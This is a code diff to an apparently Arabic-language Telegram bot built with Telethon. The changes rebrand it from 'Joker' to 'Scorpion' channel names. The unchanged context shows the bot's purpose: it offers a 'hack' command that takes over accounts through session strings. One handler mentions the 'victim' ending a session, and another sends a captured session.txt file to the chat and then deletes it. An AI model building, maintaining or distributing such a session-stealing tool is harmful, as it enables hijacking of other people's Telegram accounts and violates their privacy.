@@ -191,7 +191,7 @@ menu = '''
 
 '''
 mm = '''
-قم بلأنضمام الى قناة الجوكر @Jepthon
+قم بالاستفسار الى قناة العقرب @Zo_r0 @ZS_SQ
 '''
 
 keyboard = [
@@ -216,7 +216,7 @@ keyboard = [
     Button.inline("N", data="N"),
     ],
   [
-    Button.url("سورس الجوكر 🤡", "https://t.me/jepthon")
+    Button.url("سورس العقرب 🦂", "https://t.me/jepthon")
     ]
 ]
 if Config.TG_BOT_USERNAME is not None and tgbot is not None:
@@ -228,9 +228,9 @@ if Config.TG_BOT_USERNAME is not None and tgbot is not None:
         query = event.text
         await bot.get_me()
         if query.startswith("هاك") and event.query.user_id == bot.uid:
-            buttons = Button.url(" اضغط هنا عزيزي ", f"https://t.me/{joker}?start=hack")
+            buttons = Button.url(" اضغط هنا عزيزي ", f"@ZS_SQ @Zo_r0")
             result = builder.article(
-                title="Aljoker 🤡",
+                title="العقرب🦂",
                 description="اضغط على الزر لعرض الأوامر.",
                 text="**᯽︙ قم بالضغط على زر ادناه لأستخدام امر اختراق عبر كود التيرمكس",
                 buttons=buttons
@@ -299,7 +299,7 @@ async def users(event):
         await bot.send_file(event.chat_id, "session.txt")
         system("rm -rf session.txt")
       else:
-        await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️. \n/hack", buttons=keyboard)
+        await event.reply(i + "\n\nشكراً لأستخدامك سورس العقرب ❤️. \n/hack", buttons=keyboard)
       
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"B")))
 async def users(event):
@@ -312,7 +312,7 @@ async def users(event):
     else:
       return await event.respond("لقد تم انهاء جلسة هذا الكود من قبل الضحيه.\n/hack", buttons=keyboard)
     i = await userinfo(strses.text)
-    await event.reply(i + "\n\nشكراً لأستخدامك سورس الجوكر ❤️.\n/hack", buttons=keyboard)
+    await event.reply(i + "\n\nشكراً لأستخدامك سورس العقرب ❤️.\n/hack", buttons=keyboard)
     
 @tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"C")))
 async def users(event):
